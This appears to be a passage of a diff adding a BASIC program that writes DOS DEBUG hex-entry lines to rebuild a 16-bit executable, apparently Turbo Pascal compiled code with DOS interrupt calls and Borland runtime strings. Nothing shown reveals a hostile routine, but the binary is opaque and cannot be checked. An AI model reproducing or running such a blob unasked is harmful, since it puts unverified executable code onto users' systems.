+Print #1, "E 0BC0 7E 0A AB 8A C6 C4 7E 0E AB 91 C4 7E 12 AB 5D CA"
+Print #1, "E 0BD0 10 00 55 8B EC 8B 4E 0A 8A 76 08 8A 56 06 B4 2B"
+Print #1, "E 0BE0 CD 21 5D CA 06 00 55 8B EC B4 2C CD 21 32 E4 8A"
+Print #1, "E 0BF0 C2 C4 7E 06 AB 8A C6 C4 7E 0A AB 8A C1 C4 7E 0E"
+Print #1, "E 0C00 AB 8A C5 C4 7E 12 AB 5D CA 10 00 55 8B EC 8A 6E"
+Print #1, "E 0C10 0C 8A 4E 0A 8A 76 08 8A 56 06 B4 2D CD 21 5D CA"
+Print #1, "E 0C20 08 00 55 8B EC B8 00 33 CD 21 C4 7E 06 26 88 15"
+Print #1, "E 0C30 5D CA 04 00 55 8B EC 8A 56 06 B8 01 33 CD 21 5D"
+Print #1, "E 0C40 CA 02 00 55 8B EC C4 7E 0A 26 8B 1D B8 00 57 CD"
+Print #1, "E 0C50 21 73 06 33 C9 33 D2 EB 02 33 C0 A3 F4 06 C4 7E"
+Print #1, "E 0C60 06 FC 91 AB 92 AB 5D CA 08 00 55 8B EC C4 7E 0A"
+Print #1, "E 0C70 26 8B 1D 8B 4E 06 8B 56 08 B8 01 57 CD 21 72 02"
+Print #1, "E 0C80 33 C0 A3 F4 06 5D CA 08 00 55 8B EC 83 EC 50 1E"
+Print #1, "E 0C90 C5 76 0C 8D 7E B0 16 07 FC AC 3C 4F 72 02 B0 4F"
+Print #1, "E 0CA0 98 91 F3 A4 32 C0 AA C5 56 06 B4 1A CD 21 8D 56"
+Print #1, "E 0CB0 B0 16 1F 8B 4E 0A B4 4E CD 21 1F C4 7E 06 E8 20"
+Print #1, "E 0CC0 00 8B E5 5D CA 0A 00 55 8B EC 1E C5 56 06 B4 1A"
+Print #1, "E 0CD0 CD 21 1F B4 4F CD 21 C4 7E 06 E8 04 00 5D CA 04"
+Print #1, "E 0CE0 00 72 1E 83 C7 1E 1E 06 1F 32 C0 B9 00 01 FC F2"
+Print #1, "E 0CF0 AE F6 D1 8A C1 4F 8B F7 4E FD F3 A4 AA FC 1F 33"
+Print #1, "E 0D00 C0 A3 F4 06 C3 55 8B EC C4 7E 06 FC 8B 46 0C B1"
+Print #1, "E 0D10 09 D3 E8 05 BC 07 AB 8B 46 0C B1 05 D3 E8 25 0F"
+Print #1, "E 0D20 00 AB 8B 46 0C 25 1F 00 AB 8B 46 0A B1 0B D3 E8"
+Print #1, "E 0D30 AB 8B 46 0A B1 05 D3 E8 25 3F 00 AB 8B 46 0A 25"
+Print #1, "E 0D40 1F 00 D1 E0 AB 5D CA 08 00 55 8B EC 1E C5 76 0A"
+Print #1, "E 0D50 FC AD 2D BC 07 B1 09 D3 E0 92 AD B1 05 D3 E0 03"
+Print #1, "E 0D60 D0 AD 03 D0 AD B1 0B D3 E0 93 AD B1 05 D3 E0 03"
+Print #1, "E 0D70 D8 AD D1 E8 03 C3 1F C4 7E 06 AB 92 AB 5D CA 08"
+Print #1, "E 0D80 00 55 8B EC 83 EC 20 1E FC C5 76 06 8D 7E E0 16"
+Print #1, "E 0D90 07 AC 3C 1F 76 02 B0 1F 98 8B C8 40 8B D0 E3 0E"
+Print #1, "E 0DA0 AC 3C 61 72 06 3C 7A 77 02 2C 20 AA E2 F2 B0 3D"
+Print #1, "E 0DB0 AA 1F 1E 8E 1E 3E 00 8E 1E 2C 00 33 F6 80 3C 00"
+Print #1, "E 0DC0 74 11 8D 7E E0 8B CA F3 A6 74 08 4E AC 0A C0 75"
+Print #1, "E 0DD0 FB EB EA 8B FE 1E 07 32 C0 B9 00 01 F2 AE F6 D1"
+Print #1, "E 0DE0 C4 7E 0A 8A C1 AA F3 A4 1F 8B E5 5D CA 04 00 55"
+Print #1, "E 0DF0 8B EC 89 26 F6 06 8C 16 F8 06 81 EC FE 00 8E 1E"
+Print #1, "E 0E00 3E 00 A1 2C 00 89 46 F2 16 07 FC C5 76 0A 8D 7E"
+Print #1, "E 0E10 82 AC 3C 4F 72 02 B0 4F 98 91 F3 A4 32 C0 AA C5"
+Print #1, "E 0E20 76 06 8D BE 02 FF AC 3C 7E 72 02 B0 7E AA 98 91"
+Print #1, "E 0E30 F3 A4 B0 0D AA 16 1F 8D B6 02 FF 89 76 F4 8C 5E"
+Print #1, "E 0E40 F6 46 8D 7E E2 89 7E F8 8C 46 FA B8 01 29 CD 21"
+Print #1, "E 0E50 8D 7E D2 89 7E FC 8C 46 FE B8 01 29 CD 21 8D 56"
+Print #1, "E 0E60 82 8D 5E F2 B8 00 4B CD 21 72 02 33 C0 BA C2 01"
+Print #1, "E 0E70 8E DA FA 8B 26 F6 06 8E 16 F8 06 FB A3 F4 06 5D"
+Print #1, "E 0E80 CA 08 00 B4 4D CD 21 CB BF 0E 09 BE FE 02 B9 13"
+Print #1, "E 0E90 00 90 FC 2E AC B4 35 CD 21 06 53 1E C5 15 B4 25"
+Print #1, "E 0EA0 CD 21 1F 8F 05 8F 45 02 83 C7 04 E2 E6 CB 00 02"
+Print #1, "E 0EB0 1B 21 23 24 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F"
+Print #1, "E 0EC0 75 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+Print #1, "E 0ED0 55 89 E5 B8 FF 00 9A 16 01 21 01 5D C3 55 89 E5"
+Print #1, "E 0EE0 E8 28 00 BF 0E 07 1E 57 0E E8 20 03 BF 0E 07 1E"
+Print #1, "E 0EF0 57 9A 09 03 21 01 BF 0E 08 1E 57 0E E8 0D 03 BF"
+Print #1, "E 0F00 0E 08 1E 57 9A 0E 03 21 01 5D CB B4 0F E8 D4 05"
+Print #1, "E 0F10 3C 07 74 0A 3C 03 76 06 B8 03 00 E8 55 00 E8 9F"
+Print #1, "E 0F20 00 B4 08 32 FF E8 BC 05 8A C4 24 7F A2 0A 07 A2"
+Print #1, "E 0F30 00 07 33 C0 A2 FB 06 A2 0B 07 A2 0C 07 40 A2 FA"
+Print #1, "E 0F40 06 8E 06 4A 00 BF 6C 00 26 8A 1D 26 3A 1D 74 FB"
+Print #1, "E 0F50 26 8A 1D B8 E4 FF 99 E8 3C 02 F7 D0 F7 D2 B9 37"
+Print #1, "E 0F60 00 F7 F1 A3 06 07 1E 0E 1F BA 38 01 B8 1B 25 CD"
+Print #1, "E 0F70 21 1F C3 8E 06 4A 00 26 80 26 87 00 FE 3C 07 74"
+Print #1, "E 0F80 06 3C 04 72 02 B0 03 50 B4 00 E8 57 05 58 0A E4"
+Print #1, "E 0F90 74 2D B8 12 11 B3 00 E8 4A 05 B8 30 11 B7 00 B2"
+Print #1, "E 0FA0 00 E8 40 05 80 FA 2A 75 16 26 80 0E 87 00 01 B8"
+Print #1, "E 0FB0 00 01 B9 00 06 E8 2C 05 B4 12 B3 20 E8 25 05 C3"
+Print #1, "E 0FC0 B4 0F E8 1F 05 50 B8 30 11 B7 00 B2 00 E8 14 05"
+Print #1, "E 0FD0 58 B1 00 0A D2 75 08 B2 18 3C 03 77 02 B1 01 8A"
+Print #1, "E 0FE0 F2 8A D4 FE CA B4 00 80 FE 18 76 02 B4 01 A3 FE"
+Print #1, "E 0FF0 06 89 16 08 07 88 0E FD 06 C6 06 FC 06 01 33 C0"
+Print #1, "E 1000 A3 02 07 89 16 04 07 C3 50 1E B8 C2 01 8E D8 80"
+Print #1, "E 1010 3E FA 06 00 74 05 C6 06 0C 07 01 1F 58 CF 80 3E"
+Print #1, "E 1020 0C 07 00 75 01 C3 C6 06 0C 07 00 B4 01 CD 16 74"
+Print #1, "E 1030 06 B4 00 CD 16 EB F4 B0 5E E8 1D 03 B0 43 E8 18"
+Print #1, "E 1040 03 E8 0E 03 E9 89 FE 8B DC 36 8B 47 04 E8 23 FF"
+Print #1, "E 1050 E8 6D FF A0 0A 07 A2 00 07 CA 02 00 8B DC 36 8A"
+Print #1, "E 1060 57 0A 36 8A 77 08 36 8A 4F 06 36 8A 6F 04 3A D1"
+Print #1, "E 1070 77 27 3A F5 77 23 FE CA 78 1F FE CE 78 1B FE C9"
+Print #1, "E 1080 3A 0E 08 07 77 13 FE CD 3A 2E 09 07 77 0B 89 16"
+Print #1, "E 1090 02 07 89 0E 04 07 E8 41 03 CA 08 00 B8 00 06 8A"
+Print #1, "E 10A0 3E 00 07 8B 0E 02 07 8B 16 04 07 E8 36 04 8B 16"
+Print #1, "E 10B0 02 07 E8 25 03 CB E8 1A 03 B8 00 06 8A 3E 00 07"
+Print #1, "E 10C0 8B CA 8A 16 04 07 E8 1B 04 CB B8 01 07 EB 03 B8"
+Print #1, "E 10D0 01 06 50 E8 FD 02 58 8A 3E 00 07 8A 0E 02 07 8A"
+Print #1, "E 10E0 EE 8B 16 04 07 3A EE 75 02 32 C0 E8 F6 03 CB 8B"
+Print #1, "E 10F0 DC 36 8A 57 06 36 8A 77 04 FE CA 02 16 02 07 72"
+Print #1, "E 1100 17 3A 16 04 07 77 11 FE CE 02 36 03 07 72 09 3A"
+Print #1, "E 1110 36 05 07 77 03 E8 C2 02 CA 04 00 E8 B5 02 8A C2"
+Print #1, "E 1120 2A 06 02 07 FE C0 CB E8 A9 02 8A C6 2A 06 03 07"
+Print #1, "E 1130 FE C0 CB 8B DC 36 8A 47 04 A8 F0 74 04 24 0F 0C"
+Print #1, "E 1140 80 80 26 00 07 70 08 06 00 07 CA 02 00 8B DC 36"
+Print #1, "E 1150 8A 47 04 24 07 B1 04 D2 E0 80 26 00 07 8F 08 06"
+Print #1, "E 1160 00 07 CA 02 00 80 26 00 07 F7 CB 80 0E 00 07 08"
+Print #1, "E 1170 CB A0 0A 07 A2 00 07 CB 8B DC 36 8B 4F 04 E3 13"
+Print #1, "E 1180 8E 06 4A 00 33 FF 26 8A 1D A1 06 07 33 D2 E8 05"
+Print #1, "E 1190 00 E2 F6 CA 02 00 2D 01 00 83 DA 00 72 05 26 3A"
+Print #1, "E 11A0 1D 74 F3 C3 8B DC 36 8B 5F 04 B8 DD 34 BA 12 00"
+Print #1, "E 11B0 3B D3 73 1A F7 F3 8B D8 E4 61 A8 03 75 08 0C 03"
+Print #1, "E 11C0 E6 61 B0 B6 E6 43 8A C3 E6 42 8A C7 E6 42 CA 02"
+Print #1, "E 11D0 00 E4 61 24 FC E6 61 CB 80 3E 0B 07 00 75 08 B4"
+Print #1, "E 11E0 01 CD 16 B0 00 74 02 B0 01 CB A0 0B 07 C6 06 0B"
+Print #1, "E 11F0 07 00 0A C0 75 12 32 E4 CD 16 0A C0 75 0A 88 26"
+Print #1, "E 1200 0B 07 0A E4 75 02 B0 03 E8 13 FE CB 8B DC 1E 36"
+Print #1, "E 1210 C5 7F 04 C7 45 02 B0 D7 C7 45 04 80 00 8D 85 80"
+Print #1, "E 1220 00 89 45 0C 8C 5D 0E C7 45 10 67 03 8C 4D 12 C6"
+Print #1, "E 1230 45 30 00 1F CA 04 00 8B DC 1E 36 C5 7F 04 B8 9F"
+Print #1, "E 1240 03 BB 7D 04 8B CB 81 7D 02 B1 D7 74 0A C7 45 02"
+Print #1, "E 1250 B2 D7 B8 4C 04 8B D8 89 45 14 8C 4D 16 89 5D 18"
+Print #1, "E 1260 8C 4D 1A 89 4D 1C 8C 4D 1E 33 C0 1F CA 04 00 55"
+Print #1, "E 1270 8B EC C4 7E 06 26 8B 55 04 4A 4A 26 8B 75 08 26"
+Print #1, "E 1280 C4 7D 0C 33 DB C6 06 0B 07 00 0E E8 5C FF B9 01"
+Print #1, "E 1290 00 3C 08 74 34 3C 13 74 30 3C 04 74 44 49 3C 1B"
+Print #1, "E 12A0 74 27 3C 01 74 23 3C 06 74 37 3C 1A 74 46 3C 0D"
+Print #1, "E 12B0 74 4F 3C 20 72 CF 3B DA 74 CB 26 88 01 43 E8 98"
+Print #1, "E 12C0 00 3B DE 76 C0 8B F3 EB BC 0B DB 74 B8 B0 08 E8"
+Print #1, "E 12D0 87 00 B0 20 E8 82 00 B0 08 E8 7D 00 4B E2 EA EB"
+Print #1, "E 12E0 A4 3B DE 74 A0 26 8A 01 3C 20 72 99 E8 6A 00 43"
+Print #1, "E 12F0 E2 EF EB 91 80 3E FB 06 00 74 8A 26 88 01 43 EB"
+Print #1, "E 1300 0A E8 4E 00 26 C7 01 0D 0A 43 43 C4 7E 06 33 C0"
+Print #1, "E 1310 26 89 45 08 26 89 5D 0A 5D CA 04 00 8B DC 36 C4"
+Print #1, "E 1320 7F 04 26 8B 4D 08 26 29 4D 08 E3 19 26 C4 7D 0C"
+Print #1, "E 1330 80 3E FC 06 00 75 0B 26 8A 05 E8 1C 00 47 E2 F7"
+Print #1, "E 1340 EB 03 E8 9C 00 E8 D6 FC 33 C0 CA 04 00 33 C0 CA"
+Print #1, "E 1350 04 00 B0 0D E8 02 00 B0 0A 53 51 52 06 50 E8 72"
+Print #1, "E 1360 00 58 3C 07 74 2A 3C 08 74 2D 3C 0D 74 33 3C 0A"
+Print #1, "E 1370 74 35 B4 09 8A 1E 00 07 32 FF B9 01 00 52 E8 63"
+Print #1, "E 1380 01 5A FE C2 3A 16 04 07 76 20 8A 16 02 07 EB 17"
+Print #1, "E 1390 B4 0E E8 4F 01 EB 13 3A 16 02 07 74 0D FE CA EB"
+Print #1, "E 13A0 09 8A 16 02 07 EB 03 E8 08 00 E8 2D 00 07 5A 59"
+Print #1, "E 13B0 5B C3 FE C6 3A 36 05 07 76 18 FE CE 51 52 B8 01"
+Print #1, "E 13C0 06 8A 3E 00 07 8B 0E 02 07 8B 16 04 07 E8 14 01"
+Print #1, "E 13D0 5A 59 C3 B4 03 32 FF E9 0A 01 B4 02 32 FF E9 03"
+Print #1, "E 13E0 01 1E 8E 1E 4A 00 8B 16 50 00 1F 8B DA 8B F7 26"
+Print #1, "E 13F0 8A 05 3C 07 74 21 3C 08 74 2C 3C 0A 74 35 3C 0D"
+Print #1, "E 1400 74 39 47 FE C2 3A 16 04 07 76 3C E8 6E 00 E8 A1"
+Print #1, "E 1410 FF 8A 16 02 07 EB 2C E8 62 00 51 52 B8 07 0E E8"
+Print #1, "E 1420 C2 00 5A 59 EB 1C E8 53 00 3A 16 02 07 74 13 FE"
+Print #1, "E 1430 CA EB 0F E8 46 00 E8 79 FF EB 07 E8 3E 00 8A 16"
+Print #1, "E 1440 02 07 47 8B F7 8B DA E2 A6 E8 30 00 1E 8E 1E 4A"
+Print #1, "E 1450 00 89 16 50 00 8A C6 F6 26 4A 00 32 F6 03 C2 8B"
+Print #1, "E 1460 C8 8B 16 63 00 B0 0E EE EB 00 8A C5 42 EE EB 00"
+Print #1, "E 1470 4A B0 0F EE EB 00 8A C1 42 EE 1F C3 3B F7 74 63"
+Print #1, "E 1480 51 52 57 1E 06 8B CF 2B CE 1E 8E 1E 4A 00 8A C7"
+Print #1, "E 1490 F6 26 4A 00 32 FF 03 C3 D1 E0 8B F8 8B 16 63 00"
+Print #1, "E 14A0 83 C2 06 80 3E 49 00 07 1F A1 50 00 75 03 A1 4E"
+Print #1, "E 14B0 00 8A 1E FD 06 8A 3E 00 07 06 1F 8E C0 FC 0A DB"
+Print #1, "E 14C0 74 16 AC 8A D8 EC A8 01 75 FB FA EC A8 01 74 FB"
+Print #1, "E 14D0 8B C3 AB FB E2 EC EB 06 8A E7 AC AB E2 FC 07 1F"
+Print #1, "E 14E0 5F 5A 59 C3 56 57 55 06 CD 10 07 5D 5F 5E C3 00"
+Print #1, "E 14F0 BA C2 01 8E DA 8C 06 3E 00 33 ED E8 E9 09 E8 A0"
+Print #1, "E 1500 00 8B C4 05 13 00 B1 04 D3 E8 8C D2 03 C2 A3 10"
+Print #1, "E 1510 00 A3 12 00 03 06 0A 00 A3 14 00 A3 1E 00 A3 22"
+Print #1, "E 1520 00 A3 2A 00 8E 06 3E 00 26 A1 02 00 A3 26 00 C7"
+Print #1, "E 1530 06 30 00 D6 00 8C 0E 32 00 BF 0E 09 BE 39 02 B9"
+Print #1, "E 1540 13 00 90 FC 2E AC B4 35 CD 21 89 1D 8C 45 02 83"
+Print #1, "E 1550 C7 04 E2 EF 1E 0E 1F BA 0C 01 B8 00 25 CD 21 BA"
+Print #1, "E 1560 13 01 B8 23 25 CD 21 BA DB 00 B8 24 25 CD 21 BA"
+Print #1, "E 1570 04 01 B8 3F 25 CD 21 1F B8 0E 07 1E 50 1E 50 B8"
+Print #1, "E 1580 63 02 0E 50 0E E8 F3 01 0E E8 6D 02 B8 0E 08 1E"
+Print #1, "E 1590 50 1E 50 B8 63 02 0E 50 0E E8 DF 01 0E E8 5E 02"
+Print #1, "E 15A0 CB 33 C0 9C 5B 80 E7 0F 53 9D 9C 59 80 E5 F0 80"
+Print #1, "E 15B0 FD F0 74 0E 40 80 CF F0 53 9D 9C 59 80 E5 F0 74"
+Print #1, "E 15C0 01 40 A2 52 00 C3 33 C0 CA 02 00 FB 83 C4 06 58"
+Print #1, "E 15D0 83 E7 1F 81 C7 96 00 80 FC 39 73 03 BF FF FF 57"
+Print #1, "E 15E0 B4 54 CD 21 8B EC 80 4E 16 01 58 5B 59 5A 5E 5F"
+Print #1, "E 15F0 5D 1F 07 CF B8 D0 00 83 C4 06 EB 03 B8 C8 00 59"
+Print #1, "E 1600 5B EB 07 B8 FF 00 33 C9 33 DB BA C2 01 8E DA FB"
+Print #1, "E 1610 A3 38 00 8B C1 0B C3 74 3D A1 16 00 0B C0 74 2F"
+Print #1, "E 1620 8E C0 26 A1 10 00 0B C0 74 1B 2B C3 77 17 F7 D8"
+Print #1, "E 1630 3D 00 10 73 10 BA 10 00 F7 E2 03 C1 72 07 26 3B"
+Print #1, "E 1640 06 08 00 72 06 26 A1 14 00 EB D1 8B C8 8C C3 2B"
+Print #1, "E 1650 1E 3E 00 83 EB 10 89 0E 3A 00 89 1E 3C 00 C4 1E"
+Print #1, "E 1660 34 00 8C C0 0B C3 74 13 33 C0 A3 34 00 A3 36 00"
+Print #1, "E 1670 A3 42 00 B8 6E 01 0E 50 06 53 CB B8 0E 07 1E 50"
+Print #1, "E 1680 0E E8 CF 01 B8 0E 08 1E 50 0E E8 C6 01 BF 0E 09"
+Print #1, "E 1690 BE 39 02 B9 13 00 90 FC 2E AC B4 25 1E C5 15 CD"
+Print #1, "E 16A0 21 1F 83 C7 04 E2 F0 A1 3A 00 0B 06 3C 00 74 29"
+Print #1, "E 16B0 BB 4C 02 E8 2A 00 A1 38 00 E8 32 00 BB 5B 02 E8"
+Print #1, "E 16C0 1E 00 A1 3C 00 E8 40 00 B0 3A E8 55 00 A1 3A 00"
+Print #1, "E 16D0 E8 35 00 BB 60 02 E8 07 00 A1 38 00 B4 4C CD 21"
+Print #1, "E 16E0 2E 8A 07 0A C0 74 06 E8 38 00 43 EB F3 C3 B1 64"
+Print #1, "E 16F0 E8 07 00 B1 0A E8 02 00 EB 04 32 E4 F6 F1 04 30"
+Print #1, "E 1700 50 E8 1E 00 58 8A C4 C3 50 8A C4 E8 01 00 58 50"
+Print #1, "E 1710 B1 04 D2 E8 E8 03 00 58 24 0F 04 30 3C 3A 72 02"
+Print #1, "E 1720 04 07 8A D0 B4 06 CD 21 C3 00 02 1B 21 23 24 34"
+Print #1, "E 1730 35 36 37 38 39 3A 3B 3C 3D 3E 3F 75 52 75 6E 74"
+Print #1, "E 1740 69 6D 65 20 65 72 72 6F 72 20 00 20 61 74 20 00"
+Print #1, "E 1750 2E 0D 0A 00 50 6F 72 74 69 6F 6E 73 20 43 6F 70"
+Print #1, "E 1760 79 72 69 67 68 74 20 28 63 29 20 31 39 38 33 2C"
+Print #1, "E 1770 39 32 20 42 6F 72 6C 61 6E 64 BA 33 D2 8B DC 1E"
+Print #1, "E 1780 36 C4 7F 08 36 C5 77 04 FC 33 C0 AB B8 B0 D7 AB"
+Print #1, "E 1790 B8 80 00 AB 33 C0 AB AB AB 8D 45 74 AB 8C C0 AB"
+Print #1, "E 17A0 B8 10 09 AB B8 21 01 AB 33 C0 B9 0E 00 F3 AB B9"
+Print #1, "E 17B0 4F 00 0B D2 75 09 AC 3A C8 76 04 8A C8 E3 08 AC"
+Print #1, "E 17C0 0A C0 74 03 AA E2 F8 32 C0 AA 1F CA 08 00 8B DC"
+Print #1, "E 17D0 36 C4 7F 0A 36 8B 47 04 26 89 45 04 36 8B 47 06"
+Print #1, "E 17E0 26 89 45 0C 36 8B 47 08 26 89 45 0E 33 C0 26 89"
+Print #1, "E 17F0 45 08 26 89 45 0A CA 0A 00 BA B1 D7 EB 08 BA B2"
+Print #1, "E 1800 D7 EB 03 BA B3 D7 55 8B EC C4 7E 06 26 8B 45 02"
+Print #1, "E 1810 3D B1 D7 74 12 3D B2 D7 74 0D 3D B0 D7 74 10 C7"
+Print #1, "E 1820 06 42 00 66 00 EB 24 52 06 57 0E E8 25 00 5A 33"
+Print #1, "E 1830 C0 26 89 55 02 26 89 45 08 26 89 45 0A BB 10 00"
+Print #1, "E 1840 E8 4C 00 74 06 26 C7 45 02 B0 D7 5D CA 04 00 B0"
+Print #1, "E 1850 00 EB 02 B0 01 55 8B EC C4 7E 06 26 81 7D 02 B1"
+Print #1, "E 1860 D7 74 18 26 81 7D 02 B2 D7 74 08 C7 06 42 00 67"
+Print #1, "E 1870 00 EB 18 50 BB 14 00 E8 15 00 58 0A C0 74 0C BB"
+Print #1, "E 1880 1C 00 E8 0A 00 26 C7 45 02 B0 D7 5D CA 04 00 06"
+Print #1, "E 1890 57 06 57 26 FF 19 0B C0 74 03 A3 42 00 5F 07 C3"
+Print #1, "E 18A0 8B DC 1E 36 C4 7F 04 26 C5 55 0C 26 8B 4D 04 26"
+Print #1, "E 18B0 8B 1D B4 3F CD 21 72 10 26 89 45 0A 33 C0 26 C7"
+Print #1, "E 18C0 45 08 00 00 1F CA 04 00 26 C7 45 0A 00 00 EB EE"
+Print #1, "E 18D0 8B DC 1E 36 C4 7F 04 26 C5 55 0C 33 C9 26 87 4D"
+Print #1, "E 18E0 08 26 8B 1D B4 40 CD 21 72 07 2B C1 74 03 B8 65"
+Print #1, "E 18F0 00 1F CA 04 00 8B DC 1E 36 C4 7F 04 26 C5 55 0C"
+Print #1, "E 1900 33 C9 26 87 4D 08 26 8B 1D B4 40 CD 21 72 02 33"
+Print #1, "E 1910 C0 1F CA 04 00 8B DC 36 C4 7F 04 26 8B 1D 83 FB"
+Print #1, "E 1920 04 76 06 B4 3E CD 21 72 02 33 C0 CA 04 00 BA 33"
+Print #1, "E 1930 D2 8B DC 1E 36 C4 7F 08 36 C5 77 04 FC 33 C0 AB"
+Print #1, "E 1940 B8 B0 D7 AB 33 C0 B9 16 00 F3 AB B9 4F 00 0B D2"
+Print #1, "E 1950 75 09 AC 3A C8 76 04 8A C8 E3 08 AC 0A C0 74 03"
+Print #1, "E 1960 AA E2 F8 32 C0 AA 1F CA 08 00 A0 54 00 B4 3D 33"
+Print #1, "E 1970 D2 EB 06 B8 00 3C BA 01 00 55 8B EC C4 7E 08 26"
+Print #1, "E 1980 81 7D 02 B0 D7 74 1A 26 81 7D 02 B3 D7 74 08 C7"
+Print #1, "E 1990 06 42 00 66 00 EB 34 50 52 06 57 0E E8 4C 00 5A"
+Print #1, "E 19A0 58 26 80 7D 30 00 74 12 1E 8D 55 30 06 1F 33 C9"
+Print #1, "E 19B0 CD 21 1F 73 06 A3 42 00 EB 11 92 26 C7 45 02 B3"
+Print #1, "E 19C0 D7 26 89 05 8B 46 06 26 89 45 04 5D CA 06 00 8B"
+Print #1, "E 19D0 DC 36 C4 7F 04 E8 38 00 75 0E 33 C9 26 8B 1D B4"
+Print #1, "E 19E0 40 CD 21 73 03 A3 42 00 CA 04 00 8B DC 36 C4 7F"
+Print #1, "E 19F0 04 E8 1C 00 75 17 26 8B 1D 83 FB 04 76 09 B4 3E"
+Print #1, "E 1A00 CD 21 73 03 A3 42 00 26 C7 45 02 B0 D7 CA 04 00"
+Print #1, "E 1A10 26 81 7D 02 B3 D7 74 06 C7 06 42 00 67 00 C3 B4"
+Print #1, "E 1A20 3F BA 64 00 EB 05 B4 40 BA 65 00 55 8B EC C4 7E"
+Print #1, "E 1A30 0A E8 DC FF 75 1B 1E 52 C5 56 06 26 8B 4D 04 26"
+Print #1, "E 1A40 8B 1D CD 21 5A 1F 72 06 3B C1 74 05 8B C2 A3 42"
+Print #1, "E 1A50 00 5D CA 04 00 B3 3F B9 64 00 EB 05 B3 40 B9 65"
+Print #1, "E 1A60 00 55 8B EC C4 7E 10 E8 A6 FF 75 3F 8B 46 0A 0B"
+Print #1, "E 1A70 C0 74 1C 1E 51 26 F7 65 04 8B C8 C5 56 0C 8A E3"
+Print #1, "E 1A80 26 8B 1D CD 21 59 1F 72 1F 33 D2 26 F7 75 04 C4"
+Print #1, "E 1A90 7E 06 8C C2 0B D7 74 05 26 89 05 EB 1C 3B 46 0A"
+Print #1, "E 1AA0 74 17 89 0E 42 00 EB 11 A3 42 00 C4 7E 06 8C C2"
+Print #1, "E 1AB0 0B D7 74 05 33 C0 26 89 05 5D CA 0E 00 55 8B EC"
+Print #1, "E 1AC0 C4 7E 0A E8 4A FF 75 21 8B 46 08 26 F7 65 04 8B"
+Print #1, "E 1AD0 C8 8B 46 06 26 F7 65 04 03 CA 8B D0 26 8B 1D B8"
+Print #1, "E 1AE0 00 42 CD 21 73 03 A3 42 00 5D CA 08 00 8B DC 1E"
+Print #1, "E 1AF0 36 C5 57 04 83 C2 30 B4 41 CD 21 1F 73 03 A3 42"
+Print #1, "E 1B00 00 CA 04 00 BA 33 D2 55 8B EC 83 EC 50 1E C5 76"
+Print #1, "E 1B10 06 8D 7E B0 16 07 FC B9 4F 00 0B D2 75 09 AC 3A"
+Print #1, "E 1B20 C8 76 04 8A C8 E3 08 AC 0A C0 74 03 AA E2 F8 32"
+Print #1, "E 1B30 C0 AA C5 56 0A 83 C2 30 8D 7E B0 B4 56 CD 21 1F"
+Print #1, "E 1B40 73 05 A3 42 00 EB 14 1E 8D 76 B0 16 1F C4 7E 0A"
+Print #1, "E 1B50 83 C7 30 FC AC AA 0A C0 75 FA 1F 8B E5 5D CA 08"
+Print #1, "E 1B60 00 55 8B EC 8B 56 06 0B D2 74 05 E8 49 00 EB 30"
+Print #1, "E 1B70 B4 30 CD 21 3C 03 B8 00 00 72 25 8E 06 3E 00 26"
+Print #1, "E 1B80 8E 06 2C 00 33 FF FC 26 3A 05 74 07 B9 FF FF F2"
+Print #1, "E 1B90 AE EB F4 83 C7 03 8B F7 B9 00 01 F2 AE 91 F6 D0"
+Print #1, "E 1BA0 1E 06 1F C4 7E 08 FC AA 91 F3 A4 1F 5D CA 02 00"
+Print #1, "E 1BB0 33 D2 E8 02 00 93 CB 8E 06 3E 00 BF 80 00 26 8A"
+Print #1, "E 1BC0 0D 32 ED 47 33 DB E3 09 26 80 3D 20 77 03 47 E2"
+Print #1, "E 1BD0 F7 8B F7 E3 09 26 80 3D 20 76 03 47 E2 F7 8B C7"
+Print #1, "E 1BE0 2B C6 74 04 43 4A 75 DE C3 FC 8B DC 8C DA 36 C4"
+Print #1, "E 1BF0 7F 08 36 C5 77 04 AC AA 8A C8 32 ED F3 A4 8E DA"
+Print #1, "E 1C00 CA 04 00 FC 8B DC 8C DA 36 C5 77 0A 36 C4 7F 06"
+Print #1, "E 1C10 36 8B 4F 04 AC 3A C1 76 02 8A C1 AA 8A C8 32 ED"
+Print #1, "E 1C20 F3 A4 8E DA CA 0A 00 FC 8B DC 8C DA 36 C4 7F 0C"
+Print #1, "E 1C30 36 C5 77 08 8A 04 32 E4 36 8B 4F 06 0B C9 7F 03"
+Print #1, "E 1C40 B9 01 00 03 F1 2B C1 72 13 40 36 8B 4F 04 0B C9"
+Print #1, "E 1C50 7D 02 33 C9 3B C1 76 06 8B C1 EB 02 33 C0 AA 8B"
+Print #1, "E 1C60 C8 F3 A4 8E DA CA 08 00 FC 8B DC 8C DA 36 C4 7F"
+Print #1, "E 1C70 08 36 C5 77 04 26 8A 0D 32 ED AC 26 00 05 73 08"
+Print #1, "E 1C80 26 C6 05 FF 8A C1 F6 D0 03 F9 47 8A C8 F3 A4 8E"
+Print #1, "E 1C90 DA CA 04 00 55 8B EC 1E C5 76 0A FC AC 0A C0 74"
+Print #1, "E 1CA0 2C 8A D0 32 F6 C4 7E 06 26 8A 0D 32 ED 2B CA 72"
+Print #1, "E 1CB0 1C 41 47 AC F2 AE 75 15 8B C7 8B D9 8B CA 49 F3"
+Print #1, "E 1CC0 A6 74 0E 8B F8 8B CB 8B 76 0A 46 EB E6 33 C0 EB"
+Print #1, "E 1CD0 04 48 2B 46 06 1F 5D CA 08 00 FC 8B DC 8C DA 36"
+Print #1, "E 1CE0 C5 77 08 36 C4 7F 04 AC 26 8A 25 47 8A C8 3A CC"
+Print #1, "E 1CF0 76 02 8A CC 0A C9 74 06 32 ED F3 A6 75 02 3A C4"
+Print #1, "E 1D00 8E DA CA 08 00 FC 8B DC 36 C4 7F 06 B0 01 AA 36"
+Print #1, "E 1D10 8A 47 04 AA CA 02 00 FC 8B DC 8C DA 36 C4 7F 0A"
+Print #1, "E 1D20 36 C5 77 06 36 8B 47 04 AA 8B C8 F3 A4 8E DA CA"
+Print #1, "E 1D30 06 00 55 8B EC 81 EC 00 02 83 7E 06 01 7D 05 C7"
+Print #1, "E 1D40 46 06 01 00 8D BE 00 FF 16 57 C4 7E 0A 06 57 B8"
+Print #1, "E 1D50 01 00 50 8B 46 06 48 50 0E E8 CB FE C4 7E 0E 06"
+Print #1, "E 1D60 57 0E E8 03 FF 8D BE 00 FE 16 57 C4 7E 0A 06 57"
+Print #1, "E 1D70 FF 76 06 B8 FF 00 50 0E E8 AC FE 0E E8 E9 FE C4"
